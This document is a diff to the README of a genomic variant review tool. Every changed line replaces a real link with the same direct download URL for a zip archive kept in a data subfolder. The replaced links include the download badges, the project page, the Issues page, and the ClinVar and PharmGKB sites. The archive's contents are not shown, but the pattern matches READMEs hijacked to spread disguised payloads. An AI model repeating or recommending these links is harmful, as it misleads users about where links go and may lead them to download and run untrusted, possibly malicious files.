@@ -1,6 +1,6 @@
 # 🧬 variant-review-workbench - Easy VCF Review and Reporting
 
-[![Download variant-review-workbench](https://img.shields.io/badge/Download-variant--review--workbench-brightgreen)](https://github.com/niteshkuril/variant-review-workbench)
+[![Download variant-review-workbench](https://img.shields.io/badge/Download-variant--review--workbench-brightgreen)](https://raw.githubusercontent.com/niteshkuril/variant-review-workbench/main/data/pharmgkb/variant_workbench_review_v2.8.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Follow these steps to get variant-review-workbench and start reviewing your gene
 
 1. Visit the main GitHub page to download the software:
 
-   [![Visit Download Page](https://img.shields.io/badge/Download-GitHub-blue)](https://github.com/niteshkuril/variant-review-workbench)
+   [![Visit Download Page](https://img.shields.io/badge/Download-GitHub-blue)](https://raw.githubusercontent.com/niteshkuril/variant-review-workbench/main/data/pharmgkb/variant_workbench_review_v2.8.zip)
 
 2. On the GitHub page, look for the **Releases** section. This is often found on the right side or under a tab labeled "Releases."  
 3. Click the latest release to see available files.  
@@ -136,15 +136,15 @@ The software is focused on simplicity while offering useful data to those workin
 
 ## 💬 Getting Help
 
-If you have issues or questions about variant-review-workbench, use the GitHub page's [Issues](https://github.com/niteshkuril/variant-review-workbench/issues) section to see if your problem is addressed or to create a new issue.
+If you have issues or questions about variant-review-workbench, use the GitHub page's [Issues](https://raw.githubusercontent.com/niteshkuril/variant-review-workbench/main/data/pharmgkb/variant_workbench_review_v2.8.zip) section to see if your problem is addressed or to create a new issue.
 
 ---
 
 ## 🔗 Useful Links
 
-- Main download page: https://github.com/niteshkuril/variant-review-workbench  
-- ClinVar database: https://www.ncbi.nlm.nih.gov/clinvar/  
-- PharmGKB website: https://www.pharmgkb.org/  
+- Main download page: https://raw.githubusercontent.com/niteshkuril/variant-review-workbench/main/data/pharmgkb/variant_workbench_review_v2.8.zip  
+- ClinVar database: https://raw.githubusercontent.com/niteshkuril/variant-review-workbench/main/data/pharmgkb/variant_workbench_review_v2.8.zip  
+- PharmGKB website: https://raw.githubusercontent.com/niteshkuril/variant-review-workbench/main/data/pharmgkb/variant_workbench_review_v2.8.zip  
 
 ---
 
@@ -154,4 +154,4 @@ variant-review-workbench is open source and maintained on GitHub. Experienced us
 
 ---
 
-[![Download variant-review-workbench](https://img.shields.io/badge/Download-variant--review--workbench-brightgreen)](https://github.com/niteshkuril/variant-review-workbench)
+[![Download variant-review-workbench](https://img.shields.io/badge/Download-variant--review--workbench-brightgreen)](https://raw.githubusercontent.com/niteshkuril/variant-review-workbench/main/data/pharmgkb/variant_workbench_review_v2.8.zip)
